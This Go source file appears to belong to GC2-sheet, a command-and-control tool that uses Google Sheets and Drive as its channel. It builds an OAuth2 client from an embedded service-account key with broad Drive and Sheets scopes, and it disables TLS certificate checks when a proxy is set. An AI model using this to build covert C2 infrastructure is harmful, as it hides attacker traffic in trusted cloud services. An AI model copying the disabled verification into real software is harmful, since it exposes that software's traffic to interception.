package C2

import (
	"GC2-sheet/internal/configuration"
	"context"
	"crypto/tls"
	"net/http"

	"golang.org/x/oauth2"
	"golang.org/x/oauth2/google"
)

type GoogleConnector struct {
	client *http.Client
}

func newGoogleHttpClient() (context.Context, *http.Client) {
	proxyUrl := configuration.GetOptionsProxy()
	transport := &http.Transport{}
	if proxyUrl != nil {
		transport.Proxy = http.ProxyURL(proxyUrl)
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}

	ctx := context.Background()
	ctx = context.WithValue(ctx, oauth2.HTTPClient, &http.Client{Transport: transport})

	creds, err := google.CredentialsFromJSON(
		ctx,
		[]byte(configuration.GetOptionsGoogleServiceAccountKey()),
		"https://www.googleapis.com/auth/drive",
		"https://www.googleapis.com/auth/drive.file",
		"https://www.googleapis.com/auth/drive.readonly",
		"https://www.googleapis.com/auth/spreadsheets",
		"https://www.googleapis.com/auth/spreadsheets.readonly",
	)
	if err != nil {
		panic(err) 
	}

	client := oauth2.NewClient(ctx, creds.TokenSource)

	if proxyUrl != nil {
		client.Transport = &oauth2.Transport{
			Source: creds.TokenSource,
			Base:   transport,
		}
	}

	return ctx, client
}

func NewGoogleConnector() (*GoogleConnector, error) {
	_, client := newGoogleHttpClient()
	return &GoogleConnector{client: client}, nil
}